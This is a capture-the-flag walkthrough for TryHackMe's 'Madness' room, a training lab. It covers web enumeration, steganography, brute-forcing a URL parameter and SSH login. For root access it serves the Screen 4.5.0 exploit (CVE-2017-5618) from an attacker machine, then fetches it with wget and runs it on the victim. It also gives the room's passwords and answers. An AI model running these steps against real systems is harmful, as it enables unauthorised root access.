# [Madness](https://tryhackme.com/room/madness)

## Will you be consumed by Madness?

# Flag Submission

### user.txt

_There's something ROTten about this guys name!_

1. Enumerate services with `nmap` to identify open ports and running services

```bash
nmap IP
```

![SCREEN01](https://github.com/user-attachments/assets/abd5fab9-d250-44af-935a-e5d7c5013d78)

2. Exploring the web server, examine the source code of the main page at `http://IP/`. There we find some interesting comments and a reference to `thm.jpg`. Download the image for further examination

```bash
wget http://IP/thm.jpg
```

![SCREEN02](https://github.com/user-attachments/assets/e72326b2-e950-4f22-be8a-a9337ff51b45)

3. The downloaded image appears broken and won't display properly. Examine the file header to identify the issue
   - The file has PNG magic numbers but a JPG extension, causing the display issue

```bash
xxd -l 24 thm.jpg
```

![SCREEN03](https://github.com/user-attachments/assets/9c2d51d6-18b3-433d-8af6-e8537d9ee361)

4. Fix the file by changing the magic numbers from PNG format to JPG format using a hex editor

```bash
hexedit thm.jpg
```

![SCREEN04](https://github.com/user-attachments/assets/2143c4d3-dd03-41a1-9bfc-031709b649a6)

5. After fixing the image, opening it reveals a hidden directory path: **/th1s_1s_h1dd3n**

![SCREEN05](https://github.com/user-attachments/assets/29e33eaa-bfba-4699-be6f-8ef7c1a1775c)

6. Navigating to `http://IP/th1s_1s_h1dd3n/` shows a page with a secret input. In the page source, we find a comment mentioning that the secret value is a number between 0 and 99

![SCREEN06](https://github.com/user-attachments/assets/e6f01682-ef81-4444-a699-8eb9be63395c)

7. The secret can be submitted via the `secret` parameter by adding `?secret=` to the URL. We can use Burp Suite's Intruder feature to brute force values from 0 to 99

![SCREEN07](https://github.com/user-attachments/assets/1e98e564-d61a-4299-b76c-24eae09d71ed)

8. In the Intruder attack results, examine the response length to identify the correct secret value
   - After submitting the correct secret value (73), we receive a string: **y2RPJ4QaPF!B**

![SCREEN08](https://github.com/user-attachments/assets/f1fac380-e209-478e-a4bf-3bfb66826bf3)

9. Return to the fixed `thm.jpg` image and use steghide to extract hidden data using **y2RPJ4QaPF!B** as the password

```bash
steghide extract -sf thm.jpg
```

![SCREEN09](https://github.com/user-attachments/assets/f3568f68-d16b-4005-af52-f0414f66e3d3)

10. The hint mentioned something "ROTten" - this suggests ROT13 encoding. Decode the username using ROT13 in [CyberChef](https://gchq.github.io/CyberChef/) to get the actual username: **joker**

![SCREEN10](https://github.com/user-attachments/assets/95d85966-7534-4d7f-80fb-1ff2badabe27)

11. For the password, we need to examine another image linked in the room description: `https://i.imgur.com/5iW7kC8.jpeg`. Download and extract hidden content with `steghide` without requiring a password

```bash
steghide extract -sf 5iW7kC8.jpg
```

![SCREEN11](https://github.com/user-attachments/assets/f5da605b-1c44-48b9-938d-bb2de6c066c3)

12. Now with both username and password, connect via SSH and retrieve the user flag

```bash
ssh joker@IP
cat user.txt
```

![SCREEN12](https://github.com/user-attachments/assets/1e04c744-5f46-4cfe-a7af-1388dff42f05)

---

### root.txt

1. Check for files with SUID permissions to identify potential privilege escalation vectors
   - The results show several binaries with SUID bit set, and `/bin/screen` looks particularly interesting as it's not commonly set with SUID permissions

```bash
find / -perm -u=s -type f 2>/dev/null
```

![SCREEN13](https://github.com/user-attachments/assets/67251758-d1a3-47d9-9db9-9c3a6ef6a352)

3. Research reveals that GNU Screen 4.5.0 has a known local privilege escalation vulnerability (CVE-2017-5618). Download the exploit from [Exploit-DB](https://www.exploit-db.com/exploits/41154) to your attacker machine and transfer it to the victim's `/tmp` directory

```bash
# On attacker machine
python3 -m http.server
```

```bash
# On victim machine
cd /tmp/
wget http://IP:8000/41154.sh
chmod +x 41154.sh
./41154.sh
whoami
cat /root/root.txt
```

![SCREEN14](https://github.com/user-attachments/assets/06d814a3-8b24-41ed-a56c-21fa70baa4a3)
